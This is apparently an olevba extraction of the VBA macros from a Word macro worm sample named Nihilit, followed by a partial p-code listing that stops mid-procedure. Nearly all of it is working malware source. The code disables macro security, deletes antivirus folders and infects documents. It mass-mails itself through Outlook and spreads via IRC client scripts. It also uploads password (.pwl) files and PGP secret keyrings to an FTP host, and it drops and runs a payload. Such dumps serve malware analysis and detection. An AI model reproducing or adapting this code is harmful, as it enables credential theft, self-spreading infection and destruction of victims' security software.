olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.Win32.Nihilit.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.Win32.Nihilit.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Nihilit.bas 
in file: Email-Worm.Win32.Nihilit.m - OLE stream: 'Macros/VBA/Nihilit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    On Error Resume Next
'==========================================
'=======  Nihilit v4.0 / Nihilit.d  =======
'==========================================
'=== (c) by Necronomikon |[Zer0Gravity] ===
'==========================================
'greets flies out to: Serial Killer(Bitte!;p),GigaByte,jackie,
'Ultras,DX100h,DrG0nzo,The Mental Driller,VirusBuster,$moothie,
'BSL4,Ratter,Benny,NBK,Del_Armg0,SnakeByte,TheWalrus,Malfuntion,
'Belial,CyberWarrior,PhileToaster,newmann,ocker,fii7e
'and all in #virus,#vir,#vxers,#zerogravity,...
'hope to forget nobody.....!
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
    Call Nihilit
    Call KillAV
    Z = Application.System.PrivateProfileString("", _
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
    "\CurrentVersion\App Paths\winzip32.exe", "")
    w = Environ("windir")
    VBA.Shell Z & " -a -r " & w & "\Nihilit.zip" _
    & Chr(32) & w & "\nihilit.doc", vbHide
End Sub

Sub Nihilit()
    On Error Resume Next
    'thanks to j´ for advanced codes
    Word.Application.Options.VirusProtection = n
    Word.Application.Options.ConfirmConversions = n
    Word.Application.Options.SaveNormalPrompt = n
    '---
    Application.DisplayAlerts = wdAlertsNone
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") &lt;&gt; 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.VBComponents.Item("Nihilit").Name &lt;&gt; "Nihilit" Then
    ActiveDocument.VBProject.VBComponents("Nihilit").Export ("C:\Windows\Nihilit.drv")
    SetAttr "C:\Windows\Nihilit.drv", 6
    End If
    Call InfectDocument
    If Month(Now()) = 12 And Day(Now()) = 14 Then Call Pgp
    Else
    Call Pwdstealer
    NormalTemplate.Saved = True
    End If
    Call UMP
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Necronomikon\ZeroGravity\Nihilit", "Irc") = "True"
    Call IRC
    'should i release a 2nd version of "Word97/2K.Blade"?
    Blade = Int(Rnd * 5)
    If Blade = 3 Then Call Delay
    ActiveDocument.SaveAs Filename:="C:\Windows\Nihilit.doc", FileFormat:=wdFormatDocument
    Set Ni_OApp = CreateObject("Outlook.Application")
    Set Ni_Mapi = Ni_OApp.GetNameSpace("MAPI")
    For Each Ni_AddList In Ni_Mapi.AddressLists
    Next
    If Ni_AddList.AddressEntries.Count &lt;&gt; 0 Then
    For Ni_AddListCount = 1 To Ni_AddList.AddressEntries.Count
    Next
    Set Ni_AddListEntry = Ni_AddList.AddressEntries(Ni_AddListCount)
    Set Ni_msg = Ni_OApp.CreateItem(0)
    Ni_msg.To = Ni_AddListEntry.Address
    Ni_msg.Subject = "Check this!!!"
    Ni_msg.Body = "I like this story!!!;o)." + vbCrLf + "Nihilit"
    Ni_msg.Attachments.Add Environ("WINDIR") & "\Nihilit.doc"
    Ni_msg.DeleteAfterSubmit = True
    If Ni_msg.To &lt;&gt; "" Then
    Ni_msg.Send
    End If
    End If
  End Sub

Sub InfectDocument()
    On Error Resume Next
    If GetAttr(ActiveDocument.FullName) = 1 Then
    SetAttr ActiveDocument.FullName, 0
    ActiveDocument.Reload
    End If
    If ActiveDocument.VBProject.VBComponents.Item("Nihilit").Name &lt;&gt; "Nihilit" Then
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\Nihilit.drv")
    ActiveDocument.Save
    End If
    SetAttr ActiveDocument.FullName, 1
End Sub

Sub Pwdstealer()
    On Error Resume Next
    With Application.FileSearch
.Filename = "*.pwl"
.LookIn = "c:"
.Execute
For i = 1 To .FoundFiles.Count
Shell "ftp http://members.tripod.com/Nihilit/"
Shell "nihilit"
Shell "killer"
Shell "post" & .FoundFiles(i)
Shell "bye"
Next i
End With
End Sub

Sub Pgp()
On Error Resume Next
'taken from WM97/Caligula by Opic[CodeBreakers]
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit3") = False) Then

pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")

If Position &lt;&gt; 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP
End If

With Application.FileSearch
    .Filename = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With

Randomize
  For i = 1 To 4
    NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"

Open "c:\sys.vxd" For Output As #1
    Print #1, "ftp http://members.tripod.com/Nihilit/"
    Print #1, "user nihilit"
    Print #1, "pass killer"
    Print #1, "cd incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1

Shell "command.com /c ftp.exe -n -s:c:\sys.vxd", vbHide

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit3") = True

End If

noPGP:
Shell " ping -l 5000 -t www.gmx.de", vbHide
Shell " ping -l 5000 -t www.symantec.com", vbHide
'my birthday MsgBox!!!;p
MsgBox "Coder of Nihilit v4.0" & vbCrLf & "---------------------------------" & vbCrLf & "(c) by Necronomikon[Zer0Gravity]", 64, "Happy Birthday Necronomikon"
Call asmdrop
End Sub

'---- from NTVCK by me!;p -----
Sub KillAV()
On Error Resume Next
Kill "C:\Progra~1\AntiViral Toolkit Pro\*.*"
Kill "C:\Progra~1\Command Software\F-PROT95\*.*"
Kill "C:\Progra~1\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Progra~1\Quick Heal\*.*"
Kill "C:\Progra~1\McAfee\VirusScan95\*.*"
Kill "C:\Progra~1\Norton AntiVirus\*.*"
Kill "C:\TBAVW95\*.*"
Kill "C:\VS95\*.*"
Kill "C:\eSafe\Protect\*.*"
Kill "C:\PC-Cillin 95\*.*"
Kill "C:\PC-Cillin 97\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Progra~1\FWIN32"
End Sub

Sub Delay()
On Error Resume Next
'some Delaystuff from NTVCK v2.0 by me!!!;p
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Microsoft Input Devices\Mouse", "DoubleClickSpeed") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Microsoft Input Devices\Keyboard", "KeyboardSpeed") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\ControlPanel\", "MenuShowDelay") = "1000"
End Sub

Sub UMP()
'-=[ULTRAS MACRO POLYMORPHIC]=-
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("nihilit").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: E = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("nihilit").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & E
Next Mutate
End Sub
'---------------

Sub IRC()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Necronomikon\ZeroGravity\Nihilit", "Irc") &lt;&gt; "True" Then
End If
Kill "C:\mirc\Script.ini"
Open "c:\mirc\script.ini" For Output As #1
Print #1, "[SCRIPT]"
Print #1, "n0=on 1:start:{"
Print #1, "n1=on 1:join:#:{"
Print #1, "n2=if ( $nick == $me ) { halt } | .dcc send $nick c:\Windows\nihilit.zip"
Print #1, "n3= }"
Print #1, "n4=on 1:input:*:.msg #nihilit [( $+ $active $+ ) $1-]"
Print #1, "n5=on 1:text:*:?:.msg #nihilit [( $+ $active $+ ) $1-]"
Print #1, "n6=on 1:FILESENT:*.*:/dcc send $nick C:\Windows\Nihilit.zip"
Print #1, "n7=on 1:connect:.msg #nihilit by Necronomikon"
Print #1, "n8=  /msg #nihilit Im Infected With A Virus from Necronomikon"
Print #1, "n9= /part #nihilit"
Print #1, "n10= /clear"
Print #1, "n11= /motd"
Print #1, "n12=on 1:connect:.msg #nihilit Alive! $ip on $server $+ : $+ $port $+"
Print #1, "n13=on 1:connect:/raw privmsg Necronomi HeyBabe! $ip on $server $+ : $+ $port $+"
Print #1, "n14= }"
Print #1, "n15=On 1:Connect:{"
Print #1, "n16=/run attrib +h script.ini"
Print #1, "n17=/run attrib +r script.ini"
Print #1, "n18=/run attrib +s script.ini"
Print #1, "n19= }"
Print #1, ";IRC.Worm for Nihilit by Necronomikon"
Close #1
Kill "C:\Windows\eventss.vxd"
Open "C:\Windows\eventss.vxd" For Output As #2
Print #2, "[Levels]"
Print #2, "Enabled=1"
Print #2, "Count=1"
Print #2, "Level1=000-Unknowns"
Print #2, "000-UnknownsEnabled=1"
Print #2, ""
Print #2, "[000-Unknowns]"
Print #2, "User1=*!*@*"
Print #2, "UserCount=1"
Print #2, "Event1=;Nihilit by Necronomikon"
Print #2, "Event2=ON JOIN:#:/dcc send $nick C:\Windows\Nihilit.zip"
Print #2, "EventCount=2"
Close #2
Kill "C:\pirch98\events.ini"
Kill "C:\pirch32\events.ini"
SourceFile = "C:\Windows\eventss.vxd"
DestinationFile = "C:\pirch98\events.ini"
FileCopy SourceFile, DestinationFile
SourceFilez = "C:\Windows\eventss.vxd"
DestinationFilez = "C:\pirch32\events.ini"
FileCopy SourceFilez, DestinationFilez
End Sub

Sub Phonecall()
On Error Resume Next
'makes a mobile-phonecall to a person i really don't like!
'thx to vic for code
Shell "dialer.exe", vbNormalFocus
SendKeys String:="01601524002", wait:=True
SendKeys String:="%d", wait:=True
For x = 1 To 500000
Next x
    SendKeys String:="~", wait:=True
SendKeys String:="%h", wait:=True
SendKeys String:="%{F4}", wait:=True
End Sub

Sub asmdrop()
On Error Resume Next
'Drop Mosquito by Deadman
Open "C:\6.com" For Output As #3
Print #3, "•‡ÖÍ!Ã"
Close #3
Shell "C:\6.com"
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
Call Phonecall
End Sub

Sub ToolsSecurity()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = True
Dialogs(wdDialogToolsSecurity).Show
CommandBars("Macro").Controls("Security...").Enabled = False
Call Phonecall
End Sub

Sub FileTemplates()
On Error Resume Next
Call Phonecall
End Sub

Sub ToolsMacro()
On Error Resume Next
    Call Stealth
    Dialogs(wdDialogToolsMacro).Display
Call Phonecall
End Sub

Sub ViewVBCode()
On Error Resume Next
    Call Stealth
    ShowVisualBasicEditor = True
Call Phonecall
End Sub

Sub Stealth()
    On Error Resume Next
    Application.OrganizerDelete Source:=NormalTemplate.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerDelete Source:=ActiveDocument.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub

Sub HelpAbout()
On Error Resume Next
WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Comic Sans MS"
    WordBasic.FontSize 60
    WordBasic.Bold
    WordBasic.Insert "Check this!"
    WordBasic.StartOfLine
    WordBasic.CharRight 1, 1
    WordBasic.FormatFont Points:="48", Color:=6
    WordBasic.EndOfLine
    WordBasic.InsertPara
    WordBasic.InsertPara
    WordBasic.FontSize 48
    WordBasic.Insert "Nihilit was coded by Necronomikon."
End Sub

Sub FileExit()
    On Error Resume Next
    Call Nihilit
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = dir(pName & "*.doc", sAttr)
If (fName &lt;&gt; "") And ((fName &lt;&gt; ".") And (fName &lt;&gt; "..")) Then InfectDoc = pName & fName
Documents.Open Filename:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName &lt;&gt; "")
fName = dir()
If (fName &lt;&gt; "") And _
((fName &lt;&gt; ".") And (fName &lt;&gt; "..")) Then
InfectDoc = pName & fName
Documents.Open Filename:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs Filename:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs Filename:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs Filename:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Nihilit
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = dir(pName & "*.doc", sAttr)
If (fName &lt;&gt; "") And ((fName &lt;&gt; ".") And (fName &lt;&gt; "..")) Then InfectDoc = pName & fName
Documents.Open Filename:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName &lt;&gt; "")
fName = dir()
If (fName &lt;&gt; "") And _
((fName &lt;&gt; ".") And (fName &lt;&gt; "..")) Then
InfectDoc = pName & fName
Documents.Open Filename:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs Filename:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs Filename:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs Filename:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Email-Worm.Win32.Nihilit.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Nihilit - 24702 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	QuoteRem 0x0000 0x002A "=========================================="
' Line #3:
' 	QuoteRem 0x0000 0x002A "=======  Nihilit v4.0 / Nihilit.d  ======="
' Line #4:
' 	QuoteRem 0x0000 0x002A "=========================================="
' Line #5:
' 	QuoteRem 0x0000 0x002A "=== (c) by Necronomikon |[Zer0Gravity] ==="
' Line #6:
' 	QuoteRem 0x0000 0x002A "=========================================="
' Line #7:
' 	QuoteRem 0x0000 0x003D "greets flies out to: Serial Killer(Bitte!;p),GigaByte,jackie,"
' Line #8:
' 	QuoteRem 0x0000 0x003E "Ultras,DX100h,DrG0nzo,The Mental Driller,VirusBuster,$moothie,"
' Line #9:
' 	QuoteRem 0x0000 0x003F "BSL4,Ratter,Benny,NBK,Del_Armg0,SnakeByte,TheWalrus,Malfuntion,"
' Line #10:
' 	QuoteRem 0x0000 0x0034 "Belial,CyberWarrior,PhileToaster,newmann,ocker,fii7e"
' Line #11:
' 	QuoteRem 0x0000 0x002E "and all in #virus,#vir,#vxers,#zerogravity,..."
' Line #12:
' 	QuoteRem 0x0000 0x001B "hope to forget nobody.....!"
' Line #13:
' 	ArgsCall Read 0x0000 
' Line #14:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St sv 
' Line #15:
' 	Ld sv 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "porno.doc"
' 	St svt$ 
' 	EndIf 
' Line #16:
' 	Ld sv 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "readme!.doc"
' 	St svt$ 
' 	EndIf 
' Line #17:
' 	Ld sv 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "sex.doc"
' 	St svt$ 
' 	EndIf 
' Line #18:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #19:
' 	ArgsCall (Call) KillAV 0x0000 
' Line #20:
' 	LineCont 0x0008 0A 00 04 00 0C 00 04 00
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows"
' 	LitStr 0x0026 "\CurrentVersion\App Paths\winzip32.exe"
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemLd System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Z 
' Line #21:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St w 
' Line #22:
' 	LineCont 0x0004 0A 00 04 00
' 	Ld Z 
' 	LitStr 0x0007 " -a -r "
' 	Concat 
' 	Ld w 
' 	Concat 
' 	LitStr 0x000C "\Nihilit.zip"
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld w 
' 	Concat 
' 	LitStr 0x000C "\nihilit.doc"
' 	Concat 
' 	Ld vbHide 
' 	Ld VBA 
' 	ArgsMemCall Shell 0x0002 
' Line #23:
' 	EndSub 
' Line #24:
' Line #25:
' 	FuncDefn (Sub Nihilit())
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	QuoteRem 0x0004 0x001F "thanks to j´ for advanced codes"
' Line #28:
' 	Ld n 
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #29:
' 	Ld n 
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Options 
' 	MemSt ConfirmConversions 
' Line #30:
' 	Ld n 
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #31:
' 	QuoteRem 0x0004 0x0003 "---"
' Line #32:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #33:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #34:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #35:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #36:
' 	Reparse 0x0083 "If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") &lt;&gt; 1& Then"
' Line #37:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x000A "AccessVBOM"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #39:
' 	Reparse 0x0059 "    If NormalTemplate.VBProject.VBComponents.Item("Nihilit").Name &lt;&gt; "Nihilit" Then"
' Line #40:
' 	LitStr 0x0016 "C:\Windows\Nihilit.drv"
' 	Paren 
' 	LitStr 0x0007 "Nihilit"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #41:
' 	LitStr 0x0016 "C:\Windows\Nihilit.drv"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	ArgsCall (Call) InfectDocument 0x0000 
' Line #44:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Pgp 0x0000 
' 	EndIf 
' Line #45:
' 	ElseBlock 
' Line #46:
' 	ArgsCall (Call) Pwdstealer 0x0000 
' Line #47:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	ArgsCall (Call) UMP 0x0000 
' Line #50:
' 	LitStr 0x0004 "True"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Necronomikon\ZeroGravity\Nihilit"
' 	LitStr 0x0003 "Irc"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #51:
' 	ArgsCall (Call) IRC 0x0000 
' Line #52:
' 	QuoteRem 0x0004 0x0034 "should i release a 2nd version of "Word97/2K.Blade"?"
' Line #53:
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	St Blade 
' Line #54:
' 	Ld Blade 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Delay 0x0000 
' 	EndIf 
' Line #55:
' 	LitStr 0x0016 "C:\Windows\Nihilit.doc"
' 	ParamNamed Filename 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #56:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set Ni_OApp 
' Line #57:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld Ni_OApp 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set Ni_Mapi 
' Line #58:
' 	StartForVariable 
' 	Ld Ni_AddList 
' 	EndForVariable 
' 	Ld Ni_Mapi 
' 	MemLd AddressLists 
' 	ForEach 
' Line #59:
' 	StartForVariable 
' 	Next 
' Line #60:
' 	Reparse 0x0036 "    If Ni_AddList.AddressEntries.Count &lt;&gt; 0 Then"
' Line #61:
' 	StartForVariable 
' 	Ld Ni_AddListCount 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Ni_AddList 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #62:
' 	StartForVariable 
' 	Next 
' Line #63:
' 	SetStmt 
' 	Ld Ni_AddListCount 
' 	Ld Ni_AddList 
' 	ArgsMemLd AddressEntries 0x0001 
' 	Set Ni_AddListEntry 
' Line #64:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld Ni_OApp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Ni_msg 
' Line #65:
' 	Ld Ni_AddListEntry 
' 	MemLd Address 
' 	Ld Ni_msg 
' 	MemSt True 
' Line #66:
' 	LitStr 0x000D "Check this!!!"
' 	Ld Ni_msg 
' 	MemSt Subject 
' Line #67:
' 	LitStr 0x0018 "I like this story!!!;o)."
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0007 "Nihilit"
' 	Add 
' 	Ld Ni_msg 
' 	MemSt Body 
' Line #68:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000C "\Nihilit.doc"
' 	Concat 
' 	Ld Ni_msg 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #69:
' 	LitVarSpecial (True)
' 	Ld Ni_msg 
' 	MemSt DeleteAfterSubmit 
' Line #70:
' 	Reparse 0x0021 "    If Ni_msg.To &lt;&gt; "" Then"
' Line #71:
' 	Ld Ni_msg 
' 	ArgsMemCall Send 0x0000 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Sub InfectDocument())
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #80:
' 	Ld ActiveDocument 
' 	ArgsMemCall Reload 0x0000 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Reparse 0x0059 "    If ActiveDocument.VBProject.VBComponents.Item("Nihilit").Name &lt;&gt; "Nihilit" Then"
' Line #83:
' 	LitStr 0x0016 "C:\Windows\Nihilit.drv"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #84:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsCall SetAttr 0x0002 
' Line #87:
' 	EndSub 
' Line #88:
' Line #89:
' 	FuncDefn (Sub Pwdstealer())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #92:
' 	LitStr 0x0005 "*.pwl"
' 	MemStWith Filename 
' Line #93:
' 	LitStr 0x0002 "c:"
' 	MemStWith LookIn 
' Line #94:
' 	ArgsMemCallWith Execute 0x0000 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #96:
' 	LitStr 0x0026 "ftp http://members.tripod.com/Nihilit/"
' 	ArgsCall Shell 0x0001 
' Line #97:
' 	LitStr 0x0007 "nihilit"
' 	ArgsCall Shell 0x0001 
' Line #98:
' 	LitStr 0x0006 "killer"
' 	ArgsCall Shell 0x0001 
' Line #99:
' 	LitStr 0x0004 "post"
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Concat 
' 	ArgsCall Shell 0x0001 
' Line #100:
' 	LitStr 0x0003 "bye"
' 	ArgsCall Shell 0x0001 
' Line #101:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #102:
' 	EndWith 
' Line #103:
' 	EndSub 
' Line #104:
' Line #105:
' 	FuncDefn (Sub Pgp())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	QuoteRem 0x0000 0x002E "taken from WM97/Caligula by Opic[CodeBreakers]"
' Line #108:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Nihilit3"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #109:
' Line #110:
' 	LitStr 0x0000 ""
' 	LitStr 0x0037 "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St pgppath 
' Line #111:
' 	LitDI2 0x0001 
' 	Ld pgppath 
' 	LitStr 0x0004 "pgpt"
' 	FnInStr3 
' 	St Position 
' Line #112:
' Line #113:
' 	Reparse 0x001B "If Position &lt;&gt; 0 Then"
' Line #114:
